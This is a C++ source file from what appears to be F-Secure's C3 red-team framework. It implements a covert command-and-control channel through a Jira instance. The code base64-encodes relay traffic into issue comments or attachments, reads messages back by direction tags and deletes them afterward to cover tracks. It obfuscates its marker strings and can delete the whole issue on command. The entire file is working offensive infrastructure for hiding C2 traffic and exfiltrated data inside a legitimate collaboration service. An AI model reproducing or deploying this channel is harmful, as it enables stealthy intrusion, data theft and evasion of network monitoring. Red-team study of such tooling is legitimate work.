#include "Stdafx.h"
#include "JiraIssue.h"
#include "Common/FSecure/Crypto/Base64.h"

using base64 = cppcodec::base64_rfc4648;

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Channels::JiraIssue::JiraIssue(ByteView arguments)
	: m_inboundDirectionName{ arguments.Read<std::string>() }
	, m_outboundDirectionName{ arguments.Read<std::string>() }
{
	auto [userAgent, host, project_key, issue_name, username, password] = arguments.Read<std::string, std::string, std::string, std::string, std::string, std::string>();
	m_jiraObj = FSecure::Jira{ userAgent, host, project_key, issue_name, username, password};
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t FSecure::C3::Interfaces::Channels::JiraIssue::OnSendToChannel(ByteView data)
{
	auto commentId = m_jiraObj.WriteCommentOnIssue(m_outboundDirectionName + OBF(":writing"));
	
	auto trimData = [&](auto size) { data = data.SubString(0, std::min(size, data.size())); };

	if (data.size() > (5 * (base64::decoded_max_size(32766) - commentId.size()))) // we'll fall back to attachments if we can't send the data in 5 comments or less 
	{
		trimData(base64::decoded_max_size(10 * 1024 * 1024));
		m_jiraObj.UploadAttachment(base64::encode<ByteVector>(data.data(), data.size()), commentId);
	}
	else
	{
		trimData(base64::decoded_max_size(32766) - commentId.size());
		m_jiraObj.WriteCommentOnIssue(commentId + ":" + base64::encode(data.data(), data.size()));
	}

	//Update the original first message with "C2S||S2C:Done" - these messages will always be read in onRecieve.
	auto message = m_outboundDirectionName + OBF(":Done");
	m_jiraObj.UpdateCommentOnIssue(commentId, message);
	return data.size();
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::JiraIssue::OnReceiveFromChannel()
{
	std::vector<ByteVector> ret;
	//Read the messages in reverse order (which is actually from the oldest to newest)
	//Avoids old messages being left behind.
	for (auto& [ts, commentId] : m_jiraObj.GetMessagesByDirection(m_inboundDirectionName + OBF(":Done")))
	{
		std::vector<std::pair<std::string, int>> replyIds;	
		std::string message;

		//Get all of the messages from the replies.
		for (auto&& reply : m_jiraObj.ReadCommentReplies(commentId))
		{
			message.append(std::get<1>(reply));
			replyIds.emplace_back(std::move(std::get<0>(reply)), std::move(std::get<2>(reply))); //get all of the ids and object types for later deletion
		}

		//Base64 decode the entire message
		auto relayMsg = cppcodec::base64_rfc4648::decode(message);

		m_jiraObj.DeleteComment(commentId);
		DeleteObjects(replyIds); //delete the relevant comments or attachments.
		ret.emplace_back(std::move(relayMsg));
	}
	return ret;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Channels::JiraIssue::DeleteObjects(std::vector<std::pair<std::string, int>> const& objectIds)
{
	for (auto& [id, type] : objectIds)
		if (type == COMMENT)
			m_jiraObj.DeleteComment(id);
		else if (type == ATTACHMENT)
			m_jiraObj.DeleteAttachment(id);
}

void FSecure::C3::Interfaces::Channels::JiraIssue::DeleteIssue()
{
	m_jiraObj.DeleteIssue();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::JiraIssue::OnRunCommand(ByteView command)
{
	auto commandCopy = command; //each read moves ByteView. CommandCopy is needed for default.
	switch (command.Read<uint16_t>())
	{
	case 0:
		DeleteIssue();
		return {};
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const char* FSecure::C3::Interfaces::Channels::JiraIssue::GetCapability()
{
	return R"_(
{
	"create":
	{
		"arguments":
		[
			[
				{
					"type": "string",
					"name": "Input ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
				"type": "string",
				"name": "User-Agent Header",
				"description": "The User-Agent header to set. Warning: adding user agent header of web browser, can cause site security provider to block access to api, and prevent channel from funcionating."
			},
			{
				"type": "string",
				"name": "Jira URL",
				"min": 1,
				"description": "URL for Jira Instance"
			},
			{
				"type": "string",
				"name": "Project Key",
				"min": 1,
				"description": "Key for project we will create an issue for, e.g. 'TEST'"
			},
			{
				"type": "string",
				"name": "Issue Name",
				"min": 1,
				"description": "Summary to give to issue, e.g. 'Bug in frontend'"
			},
			{
				"type": "string",
				"name": "Username",
				"min": 1,
				"description": "Jira Username"
			},
			{
				"type": "string",
				"name": "Password / API Token",
				"min": 1,
				"description": "Jira User Password or API Token (for JIRA Cloud)"
			}
		]
	},
	"commands": [
		{
			"name": "Delete Issue",
			"id": 0,
			"description": "Delete issue used for channel.",
			"arguments": []
		}
	]
}
)_";
}

